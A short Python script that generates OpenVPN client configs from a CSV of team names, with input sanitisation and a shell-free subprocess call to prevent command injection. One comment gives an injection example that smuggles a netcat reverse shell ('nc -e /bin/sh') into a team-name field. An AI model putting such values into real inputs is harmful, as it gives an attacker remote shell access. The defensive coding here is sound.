import csv
import sys
import os
import subprocess
import re 

clients_list = sys.argv[1] 


# please sanitize the shit out of the CSV file especially from command injections
# if "Team Name" had a something like "&& nc -e /bin/sh 10.0.0.1 4444" then you're f**ked	

with open(clients_list, mode='r') as csv_file:
	csv_reader = csv.DictReader(csv_file)
	

	# and assuming there is a column called "Team Name"
	
	line_count = 1

	for row in csv_reader:
		
		# removing bad characters
		team_name = row["ID"].replace(" ","").replace("$","S").replace("!","I").replace("@","_at_").replace("€","E")
		team_name = re.sub(r'[^\w]','',team_name)

		

		# reminder to sanitize the csv file from command injections
		#os.system(f'bash batch-openvpn.sh {team_name} > /dev/null 2>&1')

		# this solves command injection vuln
		subprocess.Popen(['bash', 'batch-openvpn.sh', team_name], shell=False)

		
		success = "\033[92m SUCCESS!!\033[00m" if os.path.exists(f'/home/silver/{team_name}.ovpn') else "\033[91m FAIL!! \033[00m"
		print(f'Created {team_name:<25s}		{success}')


		line_count += 1



print(f'\n\n 		Done {line_count} records!\n\n\n')

